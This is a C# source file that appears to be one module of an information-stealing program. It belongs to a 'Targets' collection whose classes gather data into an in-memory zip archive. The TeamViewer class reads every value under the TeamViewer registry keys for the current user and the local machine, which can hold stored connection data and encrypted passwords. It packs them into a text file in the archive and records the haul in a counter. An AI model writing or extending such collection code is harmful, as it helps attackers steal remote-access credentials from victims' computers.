using System.Collections.Generic;
using System.Linq;
using Intelix.Helper;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Applications;

public class TeamViewer : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		List<string> list = new List<string>();
		using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\TeamViewer"))
		{
			list.AddRange(RegistryParser.ParseKey(key));
		}
		using (RegistryKey key2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\TeamViewer", writable: false))
		{
			list.AddRange(RegistryParser.ParseKey(key2));
		}
		if (list.Any())
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "TeamViewer";
			string text = "TeamViewer\\Registry.txt";
			zip.AddTextFile(text, string.Join("\n", list));
			counterApplications.Files.Add("SOFTWARE\\TeamViewer => " + text);
			counterApplications.Files.Add(text);
			counter.Applications.Add(counterApplications);
		}
	}
}
